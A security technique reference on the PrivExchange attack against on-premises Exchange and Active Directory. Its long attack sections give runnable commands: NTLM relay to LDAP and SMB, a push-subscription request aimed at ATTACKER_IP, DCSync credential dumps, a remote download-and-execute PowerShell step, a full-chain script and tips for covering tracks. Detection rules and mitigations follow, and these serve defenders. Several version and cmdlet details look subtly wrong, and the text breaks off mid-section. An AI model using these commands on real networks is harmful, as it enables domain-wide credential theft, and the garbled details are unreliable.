# [PE-REMOTE-002]: PrivExchange Attack

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-REMOTE-002 |
| **MITRE ATT&CK v18.1** | [T1210 - Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/) |
| **Tactic** | Privilege Escalation / Lateral Movement |
| **Platforms** | Windows AD (Exchange 2010, 2013, 2016, 2019) |
| **Severity** | **Critical** |
| **CVE** | CVE-2019-0686 (PrivExchange - Primary), CVE-2019-0604 (SharePoint Correlation) |
| **Technique Status** | **FIXED** (Patched in February 2019; mitigations required) |
| **Last Verified** | 2024-12-15 |
| **Affected Versions** | Exchange Server 2010 SP3+, Exchange 2013 CU1-CU21, Exchange 2016 CU1-CU17, Exchange 2019 CU1-CU7 |
| **Patched In** | Exchange 2010 SP3 KB4490059, Exchange 2013 CU22+, Exchange 2016 CU18+, Exchange 2019 CU8+ |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## Executive Summary

**Concept:** PrivExchange (CVE-2019-0686) is a **privilege escalation vulnerability** that chains together three known weaknesses: (1) **Exchange's default elevated privileges in Active Directory**, (2) **NTLM relay attack vulnerability**, and (3) **Exchange's PushSubscription API** feature which forces the Exchange server to authenticate using NTLM over HTTP. By exploiting these components, any user with a mailbox can escalate to **Domain Administrator** without requiring administrative privileges on the Exchange server itself. The attack uses the Exchange server's computer account (which is a member of the "Exchange Windows Permissions" group) and its default `WriteDacl` privilege on the AD domain object to grant the attacker `DCSync` rights (Replicating Directory Changes), enabling credential harvesting from the Domain Controller.

**Attack Surface:** The vulnerability is exposed through the Exchange Web Services (EWS) API, specifically the `PushSubscription` feature which is enabled by default. The attack vector requires (1) a valid user account with a mailbox (can be a regular employee mailbox), (2) network access to the Exchange server port 443 (HTTPS), and (3) the ability to set up an NTLM relay listener (typically on port 80 or 443 from attacker-controlled infrastructure).

**Business Impact:** **Complete Active Directory compromise leading to domain-wide breach.** Attackers leverage this vulnerability to extract all user password hashes and Kerberos keys via DCSync, create backdoor Domain Admin accounts, and establish persistent access across the entire forest. The attack is "living off the land"—it uses only built-in Exchange APIs and standard Windows protocols, leaving minimal forensic evidence. Organizations cannot detect this attack through standard endpoint monitoring because all traffic is legitimate, authenticated NTLM protocol.

**Technical Context:** The exploitation typically takes **2-10 minutes** once a compromised mailbox is available. The attack chain is deterministic—if proper mitigations are not in place, it will succeed. Multiple variants exist that bypass specific mitigations (e.g., Extended Protection bypass via relay to LDAP instead of SMB). The stealth factor is **very high**—no unusual file creation, process execution, or malware signature is generated during the core attack.

### Operational Risk

- **Execution Risk:** **High** – Results in Domain Administrator compromise with no recovery path except full AD forest rebuild.
- **Stealth:** **Very High** – No process creation, file writes, or unusual event logs. Traffic is legitimate NTLM negotiation over HTTP(S).
- **Reversibility:** **No** – Once Domain Admin is achieved, attacker maintains persistence through multiple backdoors.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Active Directory Benchmark v2.0 (Section 5.1-5.3) | Implement principle of least privilege; reduce Exchange privileges; enable Extended Protection for Authentication. |
| **DISA STIG** | AD-000100, EX-000001 | Implement split permissions model; restrict service account privileges; enforce signing/sealing on NTLM. |
| **CISA SCuBA** | AD.AC.02, AD.AC.08 | Enforce Extended Protection; disable NTLM relay for critical services. |
| **NIST 800-53** | AC-2 (Account Management), AC-3 (Access Enforcement), SC-7 (Boundary Protection) | Implement least privilege; restrict high-privileged group membership; segregate network segments. |
| **GDPR** | Article 32 (Security of Processing) | Technical measures must ensure only authorized access; implement strong authentication and network segmentation. |
| **DORA** | Article 9 (Protection and Prevention) | Operators must prevent privilege escalation through secure service configurations. |
| **NIS2** | Article 21 (Cyber Risk Management Measures) | Implement detection controls; enforce multi-factor authentication; maintain service hardening baselines. |
| **ISO 27001** | A.9.2.3 (User Access Rights), A.9.2.5 (Review of User Access Rights) | Restrict access to administrative functions; regularly audit group memberships. |
| **ISO 27005** | Risk Scenario: "Privilege Escalation via Exchange Services" | Likelihood: High (if unpatched); Impact: Critical (AD compromise). |

---

## Technical Prerequisites

- **Required Privileges:** 
  - Any valid user account with a mailbox (including contractor/guest mailboxes).
  - No Exchange administrative privileges needed.
  - No Domain Admin needed.

- **Required Access:** 
  - Network access to Exchange Server port 443 (HTTPS) for EWS API calls.
  - Ability to set up an NTLM relay listener (can be on any network segment; typically attacker-controlled server with public/private IP).
  - (Optional) Network access to Domain Controller port 389 (LDAP) if relaying to LDAP (default PrivExchange method).

**Supported Versions:**
- **Exchange Server 2010:** SP3 (affected; patched via KB4490059)
- **Exchange Server 2013:** CU1 through CU21 (patched in CU22)
- **Exchange Server 2016:** CU1 through CU17 (patched in CU18)
- **Exchange Server 2019:** CU1 through CU7 (patched in CU8)
- **Exchange Online:** NOT affected (cloud service is architecturally different and does not have this privilege escalation path)

**NOT Affected (per original research by Dirk-jan Mollema):**
- Exchange 2010 SP3 with certain configurations (may require manual testing)
- Installations with Extended Protection enabled on EWS
- Environments with split permissions model (AD split permissions, not shared permissions)

**Tools:**
- [PrivExchange.py](https://github.com/dirkjanm/PrivExchange) (Original PoC by Dirk-jan Mollema)
- [impacket/ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket) (NTLM relay tool - impacket library)
- [powerPriv.ps1](https://github.com/TheDarkMoon/powerPriv) (PowerShell alternative)
- [Exchange On-Premises Mitigation Tool (EOMT.ps1)](https://microsoft.github.io/CSS-Exchange/Security/EOMT/) (Microsoft detection & mitigation)
- [Responder.py](https://github.com/lgandx/Responder) (Optional - for NTLM capture/relay on local network)

---

## Environmental Reconnaissance

### Management Station / PowerShell Reconnaissance

**Check if PrivExchange Mitigations are Active:**
```powershell
# Check if Extended Protection for Authentication (EPA) is enabled on EWS
Get-WebConfigurationProperty -ppath "IIS:\Sites\Default Web Site\ews\Exchange.asmx" `
  -filter "system.webServer/security/authentication/windowsAuthentication" `
  -name "extendedProtectionTokenChecking"

# Expected Output if VULNERABLE:
# extendedProtectionTokenChecking : None (or not present)

# Expected Output if PATCHED:
# extendedProtectionTokenChecking : Require

# Alternative: Check via Exchange Management Shell
Get-EWSVirtualDirectory -Identity "ExchangeServer\ews (Default Web Site)" | Select-Object ExtendedProtectionTokenChecking

# Expected Output if PATCHED:
# ExtendedProtectionTokenChecking : Require
```

**Verify Exchange Version & Patch Level:**
```powershell
# Get Exchange Server version
Get-ExchangeServer | Select-Object Name, ServerRole, AdminDisplayVersion

# Expected Output for VULNERABLE versions:
# Name                 : EXCH01
# AdminDisplayVersion  : Version 15.1 (Build 2034.27)  <- Exchange 2019 CU7 (VULNERABLE)

# Expected Output for PATCHED versions:
# AdminDisplayVersion  : Version 15.1 (Build 2034.32)  <- Exchange 2019 CU8+ (PATCHED)

# Query the specific CU version
Get-ExchangeServer | Select-Object @{n="CU";e={if($_.AdminDisplayVersion -match "CU(\d+)") {$matches[1]} else {"Unknown"}}}
```

**Test EWS Push Subscription Access (requires valid mailbox):**
```powershell
# Establish connection to Exchange Web Services
$uri = "https://EXCHANGESERVER/ews/exchange.asmx"
$creds = Get-Credential

# Create a simple EWS subscription request to test access
$soapRequest = @"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016"/>
  </soap:Header>
  <soap:Body>
    <GetItem xmlns="http://schemas.microsoft.com/exchange/services/2006/messages">
      <ItemShape>
        <t:BaseShape>IdOnly</t:BaseShape>
      </ItemShape>
      <ItemIds>
        <t:DistinguishedFolderId Id="inbox"/>
      </ItemIds>
    </GetItem>
  </soap:Body>
</soap:Envelope>
"@

# Attempt connection
try {
    $response = Invoke-WebRequest -Uri $uri -Method Post -Body $soapRequest `
      -ContentType "text/xml" -Credential $creds -SkipCertificateCheck
    Write-Host "✓ EWS is accessible and responding" -ForegroundColor Green
    Write-Host "✓ User has mailbox access" -ForegroundColor Green
} catch {
    Write-Host "✗ EWS connection failed or user lacks mailbox access" -ForegroundColor Red
}
```

### Linux/Bash / CLI Reconnaissance

```bash
# Identify Exchange servers via DNS
nslookup mail.contoso.com

# Check if EWS endpoint is accessible
curl -v -k --ntlm --user username:password \
  -X GET https://mail.contoso.com/ews/exchange.asmx

# Expected Response if ACCESSIBLE:
# HTTP/1.1 200 OK
# This indicates EWS is accessible and authentication is working

# Verify that NTLM negotiation is possible (sign of vulnerability)
curl -v -k --negotiate https://mail.contoso.com/ews/exchange.asmx

# Expected Response if VULNERABLE (no EPA):
# 401 Unauthorized (with NTLM offered)

# Expected Response if PATCHED (EPA enabled):
# May still respond but EPA will block relay attempts
```

---

## Detailed Execution Methods

### METHOD 1: Standard PrivExchange Attack (NTLM Relay to LDAP + DCSync)

This is the **primary exploitation method** from the original PrivExchange PoC. It uses the PushSubscription API to force Exchange to authenticate via NTLM to an attacker-controlled server, then relays that authentication to a Domain Controller's LDAP service to escalate privileges.

**Supported Versions:** Exchange 2010 SP3 through Exchange 2019 CU7 (all vulnerable versions)

**Prerequisites:**
- Valid mailbox credentials (any user with a mailbox)
- Network access to Exchange server (HTTPS port 443)
- Ability to intercept and relay NTLM (attacker-controlled server with internet-facing IP or internal network access)
- Network access to Domain Controller LDAP (port 389 or 636)

#### Step 1: Setup NTLM Relay Listener

**Objective:** Start an NTLM relay server that will accept the Exchange server's authentication attempt and relay it to the Domain Controller's LDAP service.

**Command (Linux - Using impacket/ntlmrelayx):**
```bash
# Start ntlmrelayx in relay mode targeting LDAP on the Domain Controller
# This will escalate privileges for the target user to include DCSync rights

ntlmrelayx.py -t ldap://dc01.contoso.com --escalate-user USERNAME

# Expected Output:
# [*] Setting up relay server
# [*] Relay target: ldap://dc01.contoso.com
# [*] Escalate user: USERNAME
# [*] Listening on 0.0.0.0:80
# [*] Server started. Waiting for NTLM relaying...
```

**What This Means:**
- The relay server is now listening on port 80 (HTTP) for NTLM authentication attempts.
- When it receives the Exchange server's NTLM authentication, it will relay it to the DC's LDAP service.
- The relay will perform an LDAP operation to modify the target user's permissions and add DCSync rights.

**OpSec & Evasion:**
- The relay server can be deployed on any network segment—it doesn't need to be on the same network as Exchange.
- However, the Exchange server must be able to reach the relay server on port 80 or 443.
- Detection likelihood: **Medium** if network monitoring is in place (unusual outbound HTTP connection from Exchange server).
- **Tip:** Use HTTPS (port 443) relay if HTTP is blocked; requires slightly more complex setup with SSL certificates.

#### Step 2: Subscribe to Push Notifications via PushSubscription API

**Objective:** Use the Exchange PushSubscription API to force the Exchange server to authenticate to the attacker's relay server using its computer account (NTLM).

**Command (PowerShell - Authenticated as mailbox user):**
```powershell
# Establish authenticated session to Exchange EWS using valid mailbox credentials
$mailboxUser = "user@contoso.com"
$password = "Password123!" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential($mailboxUser, $password)

# EWS URL - modify for your environment
$exchangeUrl = "https://mail.contoso.com/ews/exchange.asmx"

# Craft SOAP request to subscribe to push notifications
# The URL parameter points to attacker's relay server
$soapRequest = @"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016"/>
  </soap:Header>
  <soap:Body>
    <m:Subscribe>
      <m:PushSubscriptionRequest>
        <t:FolderIds>
          <t:DistinguishedFolderId Id="inbox"/>
        </t:FolderIds>
        <t:EventTypes>
          <t:EventType>NewMailEvent</t:EventType>
        </t:EventTypes>
        <t:URL>http://ATTACKER_IP:80/</t:URL>
        <t:Watermark>0</t:Watermark>
        <t:StatusFrequency>1</t:StatusFrequency>
      </m:PushSubscriptionRequest>
    </m:Subscribe>
  </soap:Body>
</soap:Envelope>
"@

# Send the subscription request
$request = [System.Net.HttpWebRequest]::Create($exchangeUrl)
$request.Method = "POST"
$request.ContentType = "text/xml; charset=utf-8"
$request.Credentials = $creds
$request.AllowAutoRedirect = $true

$streamWriter = New-Object System.IO.StreamWriter($request.GetRequestStream())
$streamWriter.Write($soapRequest)
$streamWriter.Close()

# Send the request (this triggers Exchange to connect to attacker's relay server)
$response = $request.GetResponse()
Write-Host "Push subscription created. Exchange will now attempt to authenticate to the relay server..."

# Close the response
$response.Close()
```

**Alternative: Using PrivExchange.py (Python - Recommended):**
```bash
# Use the original PrivExchange.py tool (simpler and more reliable)
python3 privexchange.py -u user@contoso.com -p Password123! \
  -d contoso.com -t mail.contoso.com \
  --exchange-version 2019 \
  -i ATTACKER_IP

# Expected Output:
# Attacking /ews/exchange.asmx on mail.contoso.com
# [*] Creating subscription request for user@contoso.com
# [*] Sending subscription request to http://ATTACKER_IP:80/
# [*] Subscription created successfully
# [+] The Exchange server will attempt to authenticate to http://ATTACKER_IP:80/
```

**What This Means:**
- The PushSubscription request tells Exchange to send push notifications to `http://ATTACKER_IP:80/`.
- Exchange will attempt to connect to this URL **from the Exchange server's computer account** (EXCH01$) using NTLM authentication.
- The Exchange server will keep retrying every X minutes (specified in the subscription) until it succeeds or the subscription expires.

**OpSec & Evasion:**
- This request uses a valid mailbox account and standard EWS API—no red flags.
- The subscription is created on the Exchange server and may persist even after the attack is complete.
- Detection likelihood: **Low** during execution; **Medium** if audit logs are reviewed (unusual subscription URL).
- **Tip:** Delete the subscription after exploitation to cover tracks: `Get-PushSubscription | Remove-PushSubscription`

#### Step 3: Exchange Server Authenticates to Relay (Automatic)

**Objective:** Exchange initiates connection to the attacker-controlled relay server and sends NTLM authentication.

**What Happens (Automatic):**
1. Exchange's notification service checks the subscription URL (`http://ATTACKER_IP:80/`).
2. Exchange attempts to deliver push notification by connecting to this URL.
3. Exchange sends HTTP POST request with NTLM authentication (using its computer account: `EXCH01$`).
4. The attacker's relay server intercepts the NTLM authentication.
5. The relay server immediately relays this NTLM authentication to the Domain Controller's LDAP service.
6. The DC's LDAP service, believing it is authenticating the Exchange server (which is trusted), allows the privilege escalation.

**Sample NTLM Relay Traffic (captured at relay server):**
```
[*] Target: ldap://dc01.contoso.com
[*] Incoming connection from 192.168.1.10 (mail.contoso.com)
[*] NTLM Challenge received: EXCH01$
[*] Relaying NTLM to ldap://dc01.contoso.com
[*] LDAP bind successful with EXCH01$ (Exchange computer account)
[*] Adding "Replicating Directory Changes All" privilege to USERNAME
[+] Privilege escalation successful!
```

**OpSec & Evasion:**
- This traffic is legitimate NTLM protocol over HTTP—no malware signatures or unusual processes.
- No process execution, file creation, or registry modifications.
- Detection likelihood: **Very Low** if relying on endpoint monitoring alone; **Medium-High** if network traffic is analyzed for NTLM relay patterns.

#### Step 4: Execute DCSync Attack

**Objective:** Now that the target user has DCSync privileges, dump all AD credentials from the Domain Controller.

**Command (PowerShell using Mimikatz or impacket):**
```powershell
# Using Mimikatz (if available on compromised system)
mimikatz.exe "lsadump::dcsync /user:krbtgt" exit

# Expected Output:
# ** Attempting to find krbtgt...
# RID  : 502 (0x1f6)
# User : krbtgt
# NTLM : 5f20d3201d00000000000000000000000
# LM   :
# SID  : S-1-5-21-...-502
```

**Command (Linux - Using impacket/secretsdump):**
```bash
# Dump all AD secrets now that DCSync privileges are granted
secretsdump.py -dc-ip 192.168.1.5 -all -just-dc \
  CONTOSO/username@dc01.contoso.com

# Expected Output:
# Dumping domain trusts information
# Domain SID: S-1-5-21-...
# Trying to parse hashes...
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f20d3201d00000000000000000000000:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f20d3201d00000000000000000000000:::
```

**What This Means:**
- The attacker now has all user password hashes from Active Directory.
- The `krbtgt` hash enables creation of **Golden Tickets** for persistence.
- The Administrator hash enables **Pass-the-Hash** attacks to compromise any domain-joined machine.

---

### METHOD 2: PrivExchange Variant - NTLM Relay to SMB

An alternative method that relays Exchange's NTLM authentication to SMB (port 445) instead of LDAP. This can be used if LDAP relay is blocked but SMB relay is available.

**Supported Versions:** Exchange 2010 SP3 through Exchange 2019 CU7

**Command (Linux - ntlmrelayx with SMB):**
```bash
# Setup SMB relay to compromise a domain-joined machine with high privileges
ntlmrelayx.py -t smb://targetserver.contoso.com --no-http-server --socks

# When Exchange connects and relays NTLM:
# [*] Target: smb://targetserver.contoso.com
# [*] Relaying NTLM to SMB
# [+] Socks proxy server started at 127.0.0.1:1080
# [+] Authenticated as EXCH01$ on targetserver
```

**Use the SOCKS proxy to execute commands as Exchange computer account:**
```bash
# Proxychains + impacket to execute commands as EXCH01$ on target
proxychains secretsdump.py -target-ip 192.168.1.10 EXCH01@targetserver

# Or use impacket's wmiexec to get a reverse shell
proxychains wmiexec.py -no-pass EXCH01@targetserver 'whoami'
```

---

### METHOD 3: PowerPriv - PowerShell Implementation

An alternative PowerShell-based implementation that doesn't require external tools like impacket.

**Supported Versions:** Exchange 2013 through Exchange 2019

**Command (PowerShell):**
```powershell
# Download and execute powerPriv
$powerPrivUrl = "https://raw.githubusercontent.com/TheDarkMoon/powerPriv/master/powerPriv.ps1"
$powerPrivScript = Invoke-WebRequest -Uri $powerPrivUrl | Select-Object -ExpandProperty Content
Invoke-Expression $powerPrivScript

# Execute the privilege escalation
Invoke-PrivExchange -exchangeServer mail.contoso.com -mailbox user@contoso.com `
  -password "Password123!" -relayServer ATTACKER_IP -targetDC dc01.contoso.com `
  -username USERNAME -domain contoso.com

# Expected Output:
# [+] Creating push subscription for user@contoso.com
# [+] Subscription created. Waiting for relay...
# [+] NTLM relay successful!
# [+] DCSync privileges granted to USERNAME
```

---

## Tools & Commands Reference

### [PrivExchange.py](https://github.com/dirkjanm/PrivExchange)

**Version:** Latest (maintained by Dirk-jan Mollema)  
**Minimum Version:** v1.0 (February 2019 onwards)  
**Supported Platforms:** Linux, macOS, Windows (with Python 3.6+)

**Installation:**
```bash
git clone https://github.com/dirkjanm/PrivExchange.git
cd PrivExchange
pip3 install -r requirements.txt

# Verify installation
python3 privexchange.py --help
```

**Usage:**
```bash
# Basic usage with mailbox credentials
python3 privexchange.py -u user@contoso.com -p Password123! \
  -d contoso.com -t mail.contoso.com -i ATTACKER_IP

# With Kerberos authentication (if available)
python3 privexchange.py -u user@contoso.com -k \
  -t mail.contoso.com -i ATTACKER_IP

# Specify Exchange version and protocol
python3 privexchange.py -u user@contoso.com -p Password123! \
  --exchange-version 2019 -t mail.contoso.com -i ATTACKER_IP
```

**Output:**
```
PrivExchange - Privilege Escalation Attack on Exchange
Targeting: mail.contoso.com

[*] Authenticating as user@contoso.com
[*] Creating push notification subscription
[*] Subscription ID: 12345
[*] Relay server: http://ATTACKER_IP:80/
[+] Subscription created successfully
[+] Waiting for NTLM relay...
```

---

### [impacket/ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket)

**Version:** Latest (continuously updated)  
**Supported Platforms:** Linux, macOS

**Installation:**
```bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .

# Verify installation
ntlmrelayx.py --help
```

**Usage for PrivExchange:**
```bash
# Relay NTLM to LDAP with privilege escalation
ntlmrelayx.py -t ldap://dc01.contoso.com --escalate-user USERNAME

# Relay to multiple targets (LDAP + SMB)
ntlmrelayx.py -t ldap://dc01.contoso.com smb://targetserver.contoso.com \
  --escalate-user USERNAME

# Run with SOCKS proxy for post-exploitation
ntlmrelayx.py -t ldap://dc01.contoso.com --escalate-user USERNAME --socks
```

---

### Script (One-Liner - Full PrivExchange Chain)

```bash
#!/bin/bash
# Full PrivExchange exploitation chain (Linux)

EXCHANGE_SERVER="mail.contoso.com"
MAILBOX="user@contoso.com"
PASSWORD="Password123!"
DOMAIN="contoso.com"
DC="dc01.contoso.com"
ATTACKER_IP="192.168.1.100"
TARGET_USER="username"  # User to escalate

echo "[*] Step 1: Starting NTLM relay server..."
ntlmrelayx.py -t ldap://$DC --escalate-user $TARGET_USER &
RELAY_PID=$!
sleep 2

echo "[*] Step 2: Forcing Exchange to authenticate..."
python3 privexchange.py -u $MAILBOX -p $PASSWORD -d $DOMAIN \
  -t $EXCHANGE_SERVER -i $ATTACKER_IP

echo "[*] Step 3: Waiting for privilege escalation..."
sleep 10

echo "[+] Step 4: DCSync privileges should now be granted to $TARGET_USER"

# Clean up relay server
kill $RELAY_PID

echo "[+] Attack complete. Use secretsdump or Mimikatz to dump AD credentials."
```

---

## Windows Event Log Monitoring

**Event ID: 5156 (Network Connection Allowed)**
- **Log Source:** Security
- **Trigger:** Exchange server initiating outbound HTTP(S) connection to non-standard IP/hostname
- **Filter:** Look for source `EXCH01$`, destination port 80 or 443, unusual remote IP
- **Applies To Versions:** All (detects the attack vector)

**Event ID: 5136 (Directory Service Object Modified)**
- **Log Source:** Directory Services
- **Trigger:** Modifications to user object adding `Replicating Directory Changes` or `Replicating Directory Changes All` permissions
- **Filter:** `Attribute Modified = "msDS-GenericPreference"` or `DirectoryServiceAuditEvent` with privilege grant
- **Applies To Versions:** All (post-exploitation detection)

**Event ID: 4662 (Operation Performed on Active Directory Object)**
- **Log Source:** Security (Audit Directory Service Changes)
- **Trigger:** DCSync operation (Replication-Get-Changes-All)
- **Filter:** `ObjectDN` contains user name, `Accesses` contains `Replication-Get-Changes-All`
- **Applies To Versions:** All

**Manual Configuration Steps (Group Policy - Enable Directory Service Audit):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **DS Access**
3. Enable:
   - **Audit Directory Service Access**: **Success and Failure**
   - **Audit Directory Service Changes**: **Success and Failure**
   - **Audit Directory Service Replication**: **Success**
4. Apply to all Domain Controllers: `gpupdate /force`

**Manual Configuration Steps (On Domain Controller - Local Security Policy):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **DS Access**
3. Enable **Audit Directory Service Changes**: Set to **Success and Failure**
4. Run `auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable`

**Real-Time Monitoring (PowerShell):**
```powershell
# Monitor for privilege escalation attempts in real-time
Get-EventLog -LogName Security -InstanceId 5136 -Newest 100 | Where-Object {
    $_.Message -match "Replicating Directory Changes"
} | Select-Object TimeGenerated, Message | Format-List

# Monitor for Directory Service replication operations
Get-EventLog -LogName Security -InstanceId 4662 -Newest 100 | Where-Object {
    $_.Message -match "Replication-Get-Changes-All" -or $_.Message -match "DCSync"
} | Select-Object TimeGenerated, Message | Format-List
```

---

## Sysmon Detection Patterns

**Minimum Sysmon Version:** 13.0+  
**Supported Platforms:** Domain Controllers (Windows Server 2016+)

**Sysmon Config XML:**
```xml
<!-- Detect PrivExchange attack indicators -->
<Sysmon schemaversion="4.40">
  <EventFiltering>
    <!-- Event ID 1: Process Creation -->
    <!-- Monitor for Mimikatz or secretsdump execution (post-exploitation) -->
    <ProcessCreate onmatch="include">
      <Image condition="contains any">
        mimikatz;secretsdump;lsass;dcsync;replicator
      </Image>
      <CommandLine condition="contains any">
        lsadump;dcsync;Replicating-Directory;DCSync
      </CommandLine>
    </ProcessCreate>
    
    <!-- Event ID 10: Process Access -->
    <!-- Monitor for LSASS access (used in credential dumping post-PrivExchange) -->
    <ProcessAccess onmatch="include">
      <TargetImage condition="is">lsass.exe</TargetImage>
      <GrantedAccess condition="is">0x1000</GrantedAccess> <!-- Query Limited Access -->
    </ProcessAccess>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file with XML above
3. Install on Domain Controllers:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Monitor for suspicious process execution:
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath "*[EventData[Data[@Name='Image' and contains(., 'mimikatz')]]]"
   ```

---

## Microsoft Sentinel Detection

### Query 1: Detect Push Subscription Creation via EWS

**Rule Configuration:**
- **Required Table:** W3CIISLog or Office 365 Exchange audit logs
- **Alert Severity:** **High**
- **Frequency:** Run every 5 minutes

**KQL Query:**
```kusto
W3CIISLog
| where csUriStem contains "ews/exchange.asmx"
| where csMethod == "POST"
| where cs_body contains "PushSubscription" or cs_body contains "subscribe"
| where cs_body contains "http://" or cs_body contains "https://"
| project TimeGenerated, cIP, csHost, csUriStem, cs_body
```

**What This Detects:**
- Unusual push notification subscriptions being created.
- Subscriptions pointing to external/attacker-controlled URLs.

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. Enter the KQL query above
4. Set **Frequency**: Every 5 minutes
5. Set **Severity**: High
6. Click **Create**

---

### Query 2: Detect Privilege Escalation via DCSync

**Rule Configuration:**
- **Required Table:** SecurityEvent (Event ID 5136 - AD object modification)
- **Alert Severity:** **Critical**
- **Frequency:** Run every 1 minute (real-time)

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 5136
| where Activity == "Directory Service Object Modified"
| where EventData contains "Replicating-Directory-Changes-All" or EventData contains "1131654656"
| project TimeGenerated, Computer, TargetUserName, Account, EventData
```

**What This Detects:**
- Unauthorized addition of DCSync privileges to user accounts.
- Indicators of post-PrivExchange privilege escalation.

---

### Query 3: Detect Outbound NTLM Relay Traffic from Exchange

**Rule Configuration:**
- **Required Table:** SecurityEvent or Zeek logs (if network logging available)
- **Alert Severity:** **High**

**KQL Query:**
```kusto
// Detect Exchange server making unusual outbound HTTP connections
SecurityEvent
| where EventID == 5156  // Network connection
| where Computer contains "EXCH" or Computer contains "Exchange"
| where (DestinationPort == 80 or DestinationPort == 443) 
   and DestinationIpAddress != "DC_IP" 
   and DestinationIpAddress != "DNS_IP"
| project TimeGenerated, Computer, DestinationIpAddress, DestinationPort, SourcePort
```

---

## Defensive Mitigations

### Priority 1: CRITICAL

**Mitigation 1: Patch to Latest Cumulative Update**

Upgrade to the following patched versions minimum:
- Exchange 2010 SP3: Apply KB4490059 (February 2019 patch)
- Exchange 2013: Cumulative Update 22 or later
- Exchange 2016: Cumulative Update 18 or later
- Exchange 2019: Cumulative Update 8 or later

**Manual Steps (PowerShell - Exchange Server):**
```powershell
# Check current version
Get-ExchangeServer | Select-Object AdminDisplayVersion

# Download latest CU from Microsoft Update Center
# https://learn.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates

# Stop Exchange services
Stop-Service -Name MSExchangeServiceHost, MSExchangeMailboxAssistants -Force

# Run CU installer
cd C:\Patches
.\Exchange2019-KB5003437-x64.exe /s /v"/qb"

# Restart services
Start-Service -Name MSExchangeServiceHost, MSExchangeMailboxAssistants

# Verify patch applied
Get-ExchangeServer | Select-Object AdminDisplayVersion
```

---

**Mitigation 2: Enable Extended Protection for Authentication (EPA) on EWS**

This is the primary mitigation that prevents NTLM relay attacks against Exchange.

**Manual Steps (Exchange Management Shell):**
```powershell
# Enable EPA on EWS virtual directory
Get-EWSVirtualDirectory | Set-EWSVirtualDirectory `
  -ExtendedProtectionTokenChecking "Require" `
  -ExtendedProtectionSPNList "HTTP/mail.contoso.com","HTTP/mail"

# Verify EPA is enabled
Get-EWSVirtualDirectory | Select-Object ExtendedProtectionTokenChecking

# Expected Output:
# ExtendedProtectionTokenChecking : Require
```

**Manual Steps (PowerShell - Alternative method via IIS):**
```powershell
# Enable EPA directly via IIS WebConfig
Set-WebConfigurationProperty -ppath "IIS:\Sites\Default Web Site\ews\exchange.asmx" `
  -filter "system.webServer/security/authentication/windowsAuthentication" `
  -name "extendedProtectionTokenChecking" -value "Require"

# Restart IIS
iisreset /restart
```

**Validation Command (Verify Fix):**
```powershell
# Verify EPA is enabled on EWS
Get-EWSVirtualDirectory | Select-Object ExtendedProtectionTokenChecking

# Expected Output (If Secure):
# ExtendedProtectionTokenChecking : Require
```

---

**Mitigation 3: Reduce Exchange Permissions in Active Directory**

Remove the dangerous WriteDacl privilege from the Exchange Windows Permissions group.

**Manual Steps (Active Directory):**
```powershell
# Connect to Active Directory
Import-Module ActiveDirectory

# Remove WriteDacl privilege from Exchange Windows Permissions group on Domain object
$domainDN = (Get-ADDomain).DistinguishedName
$exchangeGroupSID = (Get-ADGroup -Identity "Exchange Windows Permissions").SID

# Remove the EXPLICIT WriteDacl ACE (requires AD ACL manipulation)
$acl = Get-Acl "AD:$domainDN"
$acl.Access | Where-Object {$_.IdentityReference -like "*Exchange Windows Permissions*" -and $_.ActiveDirectoryRights -like "*WriteDacl*"} | ForEach-Object {
    $acl.RemoveAccessRule($_)
}
Set-Acl "AD:$domainDN" $acl

# Verify removal
Get-Acl "AD:$domainDN" | Where-Object {$_.IdentityReference -like "*Exchange Windows Permissions*"}
```

**Alternative: Run Setup.exe /PrepareAD (requires new Exchange installer):**
```cmd
# On a server with the latest Exchange CU installer
cd C:\Exchange\
.\Setup.exe /PrepareAD

# This automatically reduces permissions to minimum required
```

---

**Mitigation 4: Implement Split Permissions Model**

Configure Exchange to use split permissions instead of shared permissions, isolating Exchange privileges from AD privileges.

**Manual Steps (PowerShell - Active Directory and Exchange):**
```powershell
# Check current permissions model
Get-OrganizationConfig | Select-Object ACLableSeparatedBy

# If "Shared" is shown, convert to split permissions
# This requires full AD forest and Exchange reconfiguration
# Run from AD-integrated Exchange server with Enterprise Admin

Set-ADServerSettings -ViewEntireForest $true
Set-OrganizationConfig -ACLableSeparatedBy Domain

